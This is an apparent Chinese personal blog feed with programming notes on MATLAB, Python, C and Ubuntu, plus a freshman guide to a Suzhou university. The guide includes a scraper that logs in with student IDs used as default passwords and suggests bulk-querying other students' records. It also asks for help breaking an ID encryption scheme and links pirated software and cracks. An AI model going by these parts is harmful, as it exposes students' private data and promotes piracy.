      <content type="html"><![CDATA[<p>　　matlab使用sym时出现：”警告: Support of strings that are not valid variable names or define a number will be removed in a future release. To create symbolic expressions, first create symbolic variables and then use operations on them. “<br>在MATLAB中，sym函数用于创建符号数字、符号变量、符号对象。符号对象的类型是sym，可以通过class(S)来验证，这里S是一个符号对象。符号变量的优点是，使用符号变量运算得到的只是一个解析解，即sym将非符号对象（如，数字，表达式，变量等）A转换为符号对象，并存储在符号变量S中。。<br>　　例如，在符号变量运算过程中pi就用pi表示，而不是具体的近似数值3.14或3.14159。使用符号变量进行运算能最大限度减少运算过程中因舍入造成的误差。符号变量也便于进行运算过程的演示。<br>　　语法格式：<br>　　S = sym(A)将非符号对象（如，数字，表达式，变量等）A转换为符号对象，并存储在符号变量S中。<br>但是在2017b版本后：As of R2017b, Mathworks added str2sym() to convert character vectors to symbolic expressions. The expressions need to be in MATLAB syntax – the sym() version expected the expressions to be in MuPAD syntax (which might be why they want to get rid of it.)<br>意思是不支持无效变量名或定义数字的字符串转换，这将在将来的版本中删除。<br>较为通行的做法是，先定义符号变量，然后对符号表达式求解：<br>例如：<br>将</p><blockquote><p>syms t;<br>f=sym(‘(2-exp(-2<em>t))</em>heaviside(t)’);<br>ezplot(f,[-1,10])</p></blockquote><p>改为：</p><blockquote><p>syms t;<br>f=sym((2-exp(-2<em>t))</em>heaviside(t));<br>ezplot(f,[-1,10])</p></blockquote><p>或者去掉sym用法</p>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> matlab </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python3异常处理和断言assert使用小结</title>
      <link href="/2019/01-18-python-error-resolve.html"/>
      <url>/2019/01-18-python-error-resolve.html</url>
      <content type="html"><![CDATA[<h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    # 代码逻辑,只要其中任意一行报错都会被捕捉</span><br><span class="line">    i = int(&apos;aaa&apos;)</span><br><span class="line">    print(i)</span><br><span class="line">except Exception as e:  # 如果出错执行</span><br><span class="line">    # 捕捉错误</span><br><span class="line">    print(e)  # invalid literal for int() with base 10: &apos;aaa&apos;</span><br><span class="line">else:</span><br><span class="line">    print(&apos;no Error&apos;)  # 当没有错误的时候才执行</span><br><span class="line">finally:  # 不管出不出错一定会执行</span><br><span class="line">    print(&apos;over&apos;)</span><br></pre></td></tr></table></figure><p>这里的Exception是一个包容所有错误的类，当然也可以写一些分类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    s = &apos;aaa&apos;</span><br><span class="line">    print(s[5])</span><br><span class="line">except IndexError as e:</span><br><span class="line">    print(e)  # string index out of range</span><br><span class="line">except IOError as e:</span><br><span class="line">    print(e)</span><br></pre></td></tr></table></figure><p>另外一种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    s = aaa</span><br><span class="line">    print(s[5])</span><br><span class="line">except (IndexError, NameError) as e:</span><br><span class="line">    print(e)  # name &apos;aaa&apos; is not defined</span><br></pre></td></tr></table></figure><h1 id="主动触发异常"><a href="#主动触发异常" class="headerlink" title="主动触发异常"></a>主动触发异常</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    raise Exception(&apos;自首&apos;)</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)  # 自首</span><br></pre></td></tr></table></figure><h1 id="自定义主动触发错误"><a href="#自定义主动触发错误" class="headerlink" title="自定义主动触发错误"></a>自定义主动触发错误</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class MyError(Exception):</span><br><span class="line">    def __init__(self, msg):</span><br><span class="line">        self.message = msg</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.message</span><br><span class="line">try:</span><br><span class="line">    raise MyError(&apos;我错了&apos;)</span><br><span class="line">except MyError as e:</span><br><span class="line">    print(e)  # 我错了</span><br></pre></td></tr></table></figure><h1 id="assert-断言"><a href="#assert-断言" class="headerlink" title="assert 断言"></a>assert 断言</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">print(123)</span><br><span class="line">assert 1 == 1  # assert 条件，满足就执行下去，不满足报错</span><br><span class="line">print(456)</span><br><span class="line">print(123)</span><br><span class="line">assert False  # AssertionError</span><br><span class="line">print(456)</span><br></pre></td></tr></table></figure><hr><p>作者：Tyran_U<br>来源：CSDN<br>原文：<a href="https://blog.csdn.net/tyrantu1989/article/details/78521298" target="_blank" rel="noopener">https://blog.csdn.net/tyrantu1989/article/details/78521298</a></p>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ubuntu下技巧总结</title>
      <link href="/2018/11-27-ubuntu-skills.html"/>
      <url>/2018/11-27-ubuntu-skills.html</url>
      <content type="html"><![CDATA[<h1 id="双系统在开机选项时设定为上一次选择的系统"><a href="#双系统在开机选项时设定为上一次选择的系统" class="headerlink" title="双系统在开机选项时设定为上一次选择的系统"></a>双系统在开机选项时设定为上一次选择的系统</h1><p>sudo gedit /etc/default/grub<br>添加 GRUB_SAVEDEFAULT=true 字段（保存上一次启动项）<br>修改GRUB_DEFAULT=0为GRUB_DEFAULT=saved（设置默认启动项为保存的上一次启动项）<br>sudo update-grub</p><h1 id="linux下锐捷客户端相关命令设定"><a href="#linux下锐捷客户端相关命令设定" class="headerlink" title="linux下锐捷客户端相关命令设定"></a>linux下锐捷客户端相关命令设定</h1><p>锐捷安装包地址：<a href="https://pan.lanzou.com/i0uanwf" target="_blank" rel="noopener">https://pan.lanzou.com/i0uanwf</a><br>解压后，执行.sh文件<br>sudo ./rjsupplicant.sh –help查看帮助（readme有结构说明）<br>sudo ./rjsupplicant.sh -s 联通|移动|电信 -u 用户名 -p 密码 -d 0<br>登陆后，network-manager自动关闭<br>利用：sudo service network-manager start重新开启<br>设定DNS:sudo vim /etc/resolve.conf</p>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>根据输入的图的邻接矩阵A，判断此图的连通分量的个数</title>
      <link href="/2018/10-24-cprogram1.html"/>
      <url>/2018/10-24-cprogram1.html</url>
      <content type="html"><![CDATA[<h1 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h1><p>输入：第一行为图的结点数n，然后n行是无向图的邻接矩阵<br>输出：连通分量的个数<br>【样例输入】<br>5<br>0 1 1 0 0<br>1 0 1 0 0<br>1 1 0 0 0<br>0 0 0 0 1<br>0 0 0 1 0<br>【样例输出】<br>2<br>5<br>0 1 0 1 1<br>1 0 1 1 0<br>0 1 0 1 1<br>1 1 1 0 1<br>1 0 1 1 0<br>【样例输出】</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line">int n;</span><br><span class="line">int g[105][105];</span><br><span class="line">int flag[1005];</span><br><span class="line">void dfs(int x)     //将所有与点y连接的点标记，认为在一个连通分量</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span>(flag[i]==0&amp;&amp;g[x][i]==1)</span><br><span class="line">  &#123;</span><br><span class="line">   flag[i]=1;</span><br><span class="line">   dfs(i);     //深度优先遍历，递归处理与点i在同一个连通分支的点</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">void tdfs()</span><br><span class="line">&#123;</span><br><span class="line">  int sum=0;</span><br><span class="line">  int i;</span><br><span class="line">  <span class="keyword">for</span>(int i=0;i&lt;n;i++)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(flag[i]==0)   //遇到新的连通分支</span><br><span class="line">    &#123;   </span><br><span class="line">      flag[i]=1;  //先标记自身,从下一行开始检索</span><br><span class="line">      dfs(i);</span><br><span class="line">      sum++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"连通分量为:%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  char c;</span><br><span class="line">  int i,j;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入节点个数:"</span>);</span><br><span class="line">  scanf(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">  <span class="keyword">if</span>(n&gt;100)</span><br><span class="line">  &#123;</span><br><span class="line">    pr  intf(<span class="string">"超出存储范围error!\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"输入图的邻接矩阵（0/1表示）:\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    <span class="keyword">for</span>(j=0;j&lt;n;)</span><br><span class="line">    &#123;</span><br><span class="line">      c=getchar();</span><br><span class="line">      <span class="keyword">if</span> (c==<span class="string">'\n'</span>||c==<span class="string">' '</span>)</span><br><span class="line">      ;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">if</span>(c!=<span class="string">'0'</span>&amp;&amp;c!=<span class="string">'1'</span>)</span><br><span class="line">   &#123;  </span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"邻接矩阵error!\n"</span>);</span><br><span class="line">      <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">      g[i][j]=c-<span class="string">'0'</span>;</span><br><span class="line">      j++;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"输入的图的邻接矩阵为:\n"</span>);  </span><br><span class="line">    <span class="keyword">for</span>(i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span>(j=0;j&lt;n;j++)</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"%d "</span>,g[i][j]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    tdfs();</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> c language programming </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>安装完Pycharm，启动时碰到&quot;failed to load jvm dll&quot;的解决方案</title>
      <link href="/2018/10-14-pycharm-error.html"/>
      <url>/2018/10-14-pycharm-error.html</url>
      <content type="html"><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>本文针对的是JetbrainsCrack包使用错误问题:<br>注意文件路径双右斜杠或者单左斜杠，正确如下图，一般出现这种错误是破解包jar路径错误或者是版本不对。<br><img src="/article_img/pycharm-solution.png" alt="&quot;pycharm-solution&quot;"></p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pycharm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>来自老学长的小小礼包</title>
      <link href="/2018/09-03-xinsheng.html"/>
      <url>/2018/09-03-xinsheng.html</url>
      <content type="html"><![CDATA[<h1 id="注：百度搜索：梦在远方suzhou，可搜索到本站。"><a href="#注：百度搜索：梦在远方suzhou，可搜索到本站。" class="headerlink" title="注：百度搜索：梦在远方suzhou，可搜索到本站。"></a>注：百度搜索：梦在远方suzhou，可搜索到本站。</h1><h1 id="学校官方攻略"><a href="#学校官方攻略" class="headerlink" title="学校官方攻略"></a>学校官方攻略</h1><p><a href="https://mp.weixin.qq.com/s/Jf9TngfHAMKHU-wz_dUrDw" target="_blank" rel="noopener">入学攻略在我手，新生报到任我行</a><br><a href="https://mp.weixin.qq.com/s/QnKJiBshRVzNahYie4A49A" target="_blank" rel="noopener">防诈骗指南</a></p><h1 id="车站识别"><a href="#车站识别" class="headerlink" title="车站识别"></a>车站识别</h1><blockquote><p><strong>建议下载巴士管家</strong><br> 第一次不会用可以直接去车站，由于滴滴顺风车等现在不安全，以下都不包括顺风车</p></blockquote> <div align="center"><img width="200" height="200" src="/article_img/巴士管家1.png"><img width="200" height="200" src="/article_img/巴士管家2.png"></div><h2 id="苏州站"><a href="#苏州站" class="headerlink" title="苏州站"></a>苏州站</h2><p>苏州站又名苏州火车站，集火车、高铁于一体的车站，车票上写的苏州站代表苏州火车站，苏州站的北广场有着短途汽车站–苏州北广场站，从苏州北广场站可以乘坐短途大巴（18元左右）到常熟南站，从常熟南站滴滴（20元不到）或者出租（30元左右）到常熟理工学院东南校区，或者乘坐4路（1元）公交，在服装皮革城乘坐，需要走一段距离，具体怎么走看导航。</p><h2 id="苏州高铁站"><a href="#苏州高铁站" class="headerlink" title="苏州高铁站"></a>苏州高铁站</h2><p>苏州高铁站又称苏州高铁北站，车票写的是苏州高铁站就是的，从苏州高铁站旁边的苏州高铁北站小的汽车站可以坐商务车直达常熟理工学院东南校区，票价18-20元左右，我通常在巴士管家上订，高铁站走过去大概5分钟，由于是商务车，有时候订不到票可以提前看票，运行时间大概在早7点到晚9点半。</p><div align="center"><img width="200" height="200" src="/article_img/巴士管家3.jpg"></div><h2 id="苏州北广场站"><a href="#苏州北广场站" class="headerlink" title="苏州北广场站"></a>苏州北广场站</h2><p>苏州北广场站和苏州站（苏州火车站）在一起，位于苏州站的北广场，出来后看牌子，苏州北广场站是乘坐短途大巴的，常熟是苏州的一个县级市，距学校还是比较远的。常熟南站距离学校比较近，可以乘坐到常熟南站或者北站，报到日学校有大巴接。</p><h2 id="苏州北站"><a href="#苏州北站" class="headerlink" title="苏州北站"></a>苏州北站</h2><p>苏州北站是苏州的一个长途汽车站，离苏州站比较近，大概走路十分钟，苏州北站也可以坐车到常熟南站|北站。</p><h2 id="常熟南站"><a href="#常熟南站" class="headerlink" title="常熟南站"></a>常熟南站</h2><p>距离常熟理工较近的短途汽车站，从这可以走路去4路公交站点（常熟皮革城）坐公交到学校,注意是东湖还是东南，到东南的不要到东湖校区下车。</p><h2 id="常熟北站"><a href="#常熟北站" class="headerlink" title="常熟北站"></a>常熟北站</h2><p>常熟的另一个短途汽车站，离学校远了一点，报到日学校也会有车接。</p><h2 id="常熟高新区"><a href="#常熟高新区" class="headerlink" title="常熟高新区"></a>常熟高新区</h2><p>东南校区旁边的同济科创园门口的一个小站，一般人不知道，这里一般是坐车去苏州高铁站的，离学校8分钟的走路，看上面的图片。</p><h2 id="自驾"><a href="#自驾" class="headerlink" title="自驾"></a>自驾</h2><p>做好堵车的准备，进常熟的高速路是双排道，一般是三排道或者四排道，会堵一段，到常熟后注意常熟的交规，比较严，注意避让行人，都是电子抓拍，精度贼高。</p><h1 id="校园小知识"><a href="#校园小知识" class="headerlink" title="校园小知识"></a>校园小知识</h1><h2 id="校园报警电话"><a href="#校园报警电话" class="headerlink" title="校园报警电话"></a>校园报警电话</h2><p>遇到困难时、发现可疑人员时、发现危险警情时请及时与校园110联系(东湖52252110东南52251030)。</p><h2 id="东南校区平面图"><a href="#东南校区平面图" class="headerlink" title="东南校区平面图"></a>东南校区平面图</h2><div align="center"><img width="200" height="200" src="/article_img/校园平面图.jpg"></div><h1 id="公选课抢课秘籍"><a href="#公选课抢课秘籍" class="headerlink" title="公选课抢课秘籍"></a>公选课抢课秘籍</h1><p>提供以下线路进行抢课，都是通向教务系统的线路，利用有的线路访问量少进行抢课，通常200以上的线路都是备用线路用的人很少，抢课几乎秒选，而190附近的是默认的线路，抢课的人较多，容易爆炸，如果下面还不够的话可以自己利用局域网扫描器扫一下看看还有哪些线路，我这是大一下（2017）的时候扫描的，现在可能不止了。<br>10.28.200.185/jwglxt/xtgl/index_initMenu.html<br>10.28.200.187/jwglxt/xtgl/index_initMenu.html<br>10.28.200.190/jwglxt/xtgl/index_initMenu.html<br>10.28.200.191/jwglxt/xtgl/index_initMenu.html<br>10.28.200.236/jwglxt/xtgl/index_initMenu.html<br>10.28.200.237/jwglxt/xtgl/index_initMenu.html</p><h1 id="VPN进入校内网查询成绩"><a href="#VPN进入校内网查询成绩" class="headerlink" title="VPN进入校内网查询成绩"></a>VPN进入校内网查询成绩</h1><p>查询网址：<a href="http://10.28.200.190.cslg.vpn358.com/jwglxt/xtgl/login_slogin.html" target="_blank" rel="noopener">http://10.28.200.190.cslg.vpn358.com/jwglxt/xtgl/login_slogin.html</a><br>说明：<br>“用户名称”和“用户密码” 是我校图书馆网站 我的图书馆 系统的证件号和密码。<br>“我的图书馆”自助找回密码说明：<br>1.如果忘记“我的图书馆”登录密码，可以使用本人的学号和姓名重置密码。操作如下：<br>访问<a href="http://210.28.165.111:8080/reader/login.php，点击“密码重置”，输入“证件号”（学号/工号）和“读者姓名”，点击“确定”，读者就能在电子邮箱中收到密码重置链接的邮件。" target="_blank" rel="noopener">http://210.28.165.111:8080/reader/login.php，点击“密码重置”，输入“证件号”（学号/工号）和“读者姓名”，点击“确定”，读者就能在电子邮箱中收到密码重置链接的邮件。</a><br>2.如果之前没有在“我的图书馆”填写并验证过电子邮箱，且忘记了密码，请在线联系图书馆服务部<br><a href="http://lib.cslg.cn/guestbook/" target="_blank" rel="noopener">http://lib.cslg.cn/guestbook/</a><br>或电话联系：<br>文科服务部（0512）52251334<br>理科服务部（0512）52251333<br>工科服务部（0512）52251676</p><h1 id="软件分享区"><a href="#软件分享区" class="headerlink" title="软件分享区"></a>软件分享区</h1><h2 id="一键式打卡查询-可自行改写为成绩查询"><a href="#一键式打卡查询-可自行改写为成绩查询" class="headerlink" title="一键式打卡查询(可自行改写为成绩查询)"></a>一键式打卡查询(可自行改写为成绩查询)</h2><p>为了安全起见，放的是局域网内打卡查询的网址，本校内学生自然不存在安全问题，校外学生可以参考代码进行改写，python上手简单，爬虫使用的难度也不大，本校学生在校外可以利用easyconnect通过VPN使用，也可以在将网址后面加上.cslg.vpn358.com先VPN登录后，再运行此程序，学生成绩查询的原理是一样的，因为涉及到隐私不会分享，学校现在对学号也采用了疑似AES加密方式（有了解并破解了的可以私聊，我请教一下），针对大批量查询可以利用循环大批量查询保存到excel表中，新版本不提供了，实际就是换成py3采用beautifulsoup等或者pyqt使得界面更优化一些，我觉得原始版更适合改写。</p><p>使用步骤：<br>1.将下列代码之一放入新建.py文件中<br>2.再新建.bat文件（<strong>windows下是dos用的.bat，linux下用shell,方法一样。</strong>新建.txt的时候后缀改为.bat,格式最好改为ANSI，DOS采用utf8中文会乱码）<br>3.再右键修改刚新建的.bat文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%python后面接的是刚新建的.py文件的路径，我是.bat和.py放在同文件夹下（默认已经安装了python环境，不会装的可以用打包式的）%</span><br><span class="line">python 1.py</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>4.保存后，双击.bat文件进行测试，python的环境下面已经标注，不同版本不同的python环境，如果是非计算机的可以使用底下的github库的代码，下载即可使用。</p><h3 id="python2-7原始版"><a href="#python2-7原始版" class="headerlink" title="python2.7原始版"></a>python2.7原始版</h3><p>这是最开始的时候测试用的一段代码，也可以实现局域网内单个查询,上面也给了注释，改写起来应该比较容易，编码转换可以百度查看。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">import urllib2</span><br><span class="line">import urllib</span><br><span class="line">import cookielib</span><br><span class="line">import re</span><br><span class="line">import string</span><br><span class="line">def login():</span><br><span class="line">    login_url=&apos;http://10.28.102.51/student/checkUser.jsp&apos;</span><br><span class="line">    my_headers = &#123;&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:63.0) Gecko/20100101 Firefox/63.0&apos;&#125;</span><br><span class="line">true#username=passwd=学号</span><br><span class="line">    data=&#123;&apos;displayName&apos;:&apos;&apos;,&apos;displayPasswd&apos;:&apos;&apos;,&apos;submit&apos;:&apos;%B5%C7++%C2%BC&apos;,&apos;userName&apos;:&apos;092716102&apos;,&apos;passwd&apos;:&apos;092716102&apos;&#125;</span><br><span class="line">    payload=urllib.urlencode(data)</span><br><span class="line">    request = urllib2.Request(login_url,data=payload,headers=my_headers)</span><br><span class="line">    return request</span><br><span class="line">def cookie_info(request):</span><br><span class="line">    #获取Cookiejar对象（存在本机的cookie消息）</span><br><span class="line">    cookieJar=cookielib.CookieJar()</span><br><span class="line">    # 实例化一个全局opener</span><br><span class="line">    opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(cookieJar))</span><br><span class="line">    #向指定的url地址发送请求，并返回服务器响应的类文件对象</span><br><span class="line">    response = urllib2.urlopen(request)</span><br><span class="line">    result = opener.open(request)</span><br><span class="line">    return opener</span><br><span class="line">def visit_page(opener,url):</span><br><span class="line">    # 访问主页 带着cookie信息</span><br><span class="line">    content = opener.open(url)</span><br><span class="line">    html = content.read().decode(&quot;gbk&quot;).encode(&quot;utf-8&quot;)</span><br><span class="line">    return html</span><br><span class="line">def result(url):</span><br><span class="line">    html=visit_page(cookie_info(login()), url)</span><br><span class="line">    res_tr = r&apos;&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;1&quot; bgcolor=&quot;#6B7DBE&quot; class=&quot;s9&quot;&gt;(.*?)&lt;/table&gt;&apos;  </span><br><span class="line">    st =  re.findall(res_tr,html,re.S|re.M)  </span><br><span class="line">    st=&apos; &apos;.join(st)</span><br><span class="line">    st =  re.findall(&quot;&lt;tr&gt;(.*?)&lt;/tr&gt;&quot;,st,re.S|re.M)  </span><br><span class="line">    st=&apos;&apos;.join(st)</span><br><span class="line">    st =  re.findall(&quot;&lt;td.*?&gt;(.*?)&lt;/td&gt;&quot;,st,re.S|re.M)</span><br><span class="line">    for nn in st:</span><br><span class="line">        nn=nn.replace(&apos;&amp;nbsp;&apos;,&apos; &apos;)</span><br><span class="line">        nn=nn.replace(&apos;&lt;b&gt;&apos;,&apos; &apos;)</span><br><span class="line">        nn=nn.replace(&apos;&lt;/b&gt;&apos;,&apos; &apos;)</span><br><span class="line">        nn=nn.strip()</span><br><span class="line">        print unicode(nn,&apos;utf-8&apos;)</span><br><span class="line">url=&apos;http://10.28.102.51/student/queryPhyInfo.jsp&apos;</span><br><span class="line">result(url)</span><br></pre></td></tr></table></figure><h3 id="python2-7原始版示例"><a href="#python2-7原始版示例" class="headerlink" title="python2.7原始版示例"></a>python2.7原始版示例</h3><p><strong>默搭建好了python环境</strong><br>步骤一:<br>新建.py文件，复制上面代码，学号改为自己的</p><div align="center"><img src="/article_img/xinsheng1.png"></div>步骤2：新建.py文件<div align="center"><img src="/article_img/xinsheng2.png"></div>步骤3：点击.bat实现打卡查询（因为学校打卡查询网站本身不稳定，请耐心等候）<div align="center"><img src="/article_img/xinsheng3.png"></div>### 原始版打包式内含py27无需再安装，下载直接可用，使用校内网或者VPN（在上面一键式打卡查询目录下有说明），下载后改一下source.py文件的username和passwd为自己的学号即可，今后使用每次点击.bat文件即可查询打开次数，此思路适用于各种固定查询，带验证码的可以利用爬虫图片下载后采用字符识别。链接：https://pan.baidu.com/s/1gmYf5SFmtDL0HVzL-Zb_Zw提取码：0ylt<h2 id="全套adobe（2017半）"><a href="#全套adobe（2017半）" class="headerlink" title="全套adobe（2017半）"></a>全套adobe（2017半）</h2><p>已经有很多新版的了，可以自行百度下载<br>链接：<a href="https://pan.baidu.com/s/1zxdOaLgS5tXwy3Zn7dXPsA" target="_blank" rel="noopener">https://pan.baidu.com/s/1zxdOaLgS5tXwy3Zn7dXPsA</a> 提取码：cy68</p><h2 id="编译器"><a href="#编译器" class="headerlink" title="编译器"></a>编译器</h2><h3 id="cfree-编译c-c"><a href="#cfree-编译c-c" class="headerlink" title="cfree 编译c/c++"></a>cfree 编译c/c++</h3><p>此款编译器还是比较方便的，可以增加AStyle插件，方便代码格式化<br>链接：<a href="https://pan.baidu.com/s/1zF8jRcTzIZ8Rnl7K-rDNgg" target="_blank" rel="noopener">https://pan.baidu.com/s/1zF8jRcTzIZ8Rnl7K-rDNgg</a>  提取码：rann，破解比较简单，百度一下验证码即可，基本都会。</p>]]></content>
      
      <categories>
          
          <category> 大学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新生 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在线学习网站集合</title>
      <link href="/2018/08-28-online-website.html"/>
      <url>/2018/08-28-online-website.html</url>
      <content type="html"><![CDATA[<h1 id="CSLG"><a href="#CSLG" class="headerlink" title="CSLG"></a>CSLG</h1><h2 id="校园网站"><a href="#校园网站" class="headerlink" title="校园网站"></a>校园网站</h2><h3 id="打卡查询"><a href="#打卡查询" class="headerlink" title="打卡查询"></a>打卡查询</h3><p>账号密码都是学号，已改为校内直接访问校外vpn登录方式。<br><a href="http://10.28.102.51.cslg.vpn358.com/student/" target="_blank" rel="noopener">http://10.28.102.51.cslg.vpn358.com/student/</a></p><h3 id="宿舍IP查询"><a href="#宿舍IP查询" class="headerlink" title="宿舍IP查询"></a>宿舍IP查询</h3><p>DNS可直接写114.114.114.114<br><a href="http://ipcx.info.cslg.edu.cn/wap.asp" target="_blank" rel="noopener">http://ipcx.info.cslg.edu.cn/wap.asp</a></p><h3 id="信息化办公室-win、linux、mac下的锐捷安装包"><a href="#信息化办公室-win、linux、mac下的锐捷安装包" class="headerlink" title="信息化办公室(win、linux、mac下的锐捷安装包)"></a>信息化办公室(win、linux、mac下的锐捷安装包)</h3><p>已改为校内直接访问校外vpn登录方式。<br><a href="http://10.28.200.248.cslg.vpn358.com/?p=1961" target="_blank" 